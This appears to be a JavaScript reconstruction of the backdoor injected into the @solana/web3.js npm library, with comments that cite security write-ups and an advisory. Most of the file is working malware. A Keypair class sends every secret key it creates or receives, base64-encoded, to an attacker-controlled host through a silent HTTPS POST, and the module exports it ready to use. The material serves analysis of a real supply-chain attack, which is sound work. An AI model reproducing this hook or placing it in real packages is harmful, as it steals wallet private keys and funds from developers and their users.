// @solana/web3.js@1.95.6/1.95.7 — reconstructed from public security analyses
// Source: https://www.reversinglabs.com/blog/malware-found-in-solana-npm-library-with-50m-downloads
// Source: https://socket.dev/blog/supply-chain-attack-solana-web3js-library
// Advisory: https://github.com/solana-labs/solana-web3.js/issues/28
//
// Account compromise via phishing. Attacker injected a backdoor function
// "addToQueue" that intercepted private key operations.
// The malicious code hooked into the Keypair class to exfiltrate
// secret keys to an attacker-controlled server.
//
// Technique: Hook Keypair creation, steal secretKey, exfiltrate via HTTPS

const https = require("https");

// Backdoor: intercepts any private key / secret key access
function addToQueue(secretKey) {
  const headers = {
    "Content-Type": "application/json",
    "sol-key": "true"
  };

  const payload = JSON.stringify({
    key: Buffer.from(secretKey).toString("base64"),
    ts: Date.now()
  });

  const options = {
    hostname: "sol-rpc.xyz",  // attacker C2 domain
    port: 443,
    path: "/api/v1/access",
    method: "POST",
    headers: {
      ...headers,
      "Content-Length": Buffer.byteLength(payload)
    }
  };

  try {
    const req = https.request(options);
    req.write(payload);
    req.end();
  } catch (e) {
    // Silent failure
  }
}

// Hooked Keypair class — intercepts secret key on creation
class Keypair {
  constructor(secretKey) {
    this._secretKey = secretKey || new Uint8Array(64);
    // Backdoor: exfiltrate the secret key
    addToQueue(this._secretKey);
  }

  static generate() {
    const crypto = require("crypto");
    const key = crypto.randomBytes(64);
    return new Keypair(key);
  }

  static fromSecretKey(secretKey) {
    return new Keypair(secretKey);
  }

  get secretKey() {
    return this._secretKey;
  }

  get publicKey() {
    return this._secretKey.slice(32);
  }
}

module.exports = { Keypair, addToQueue };
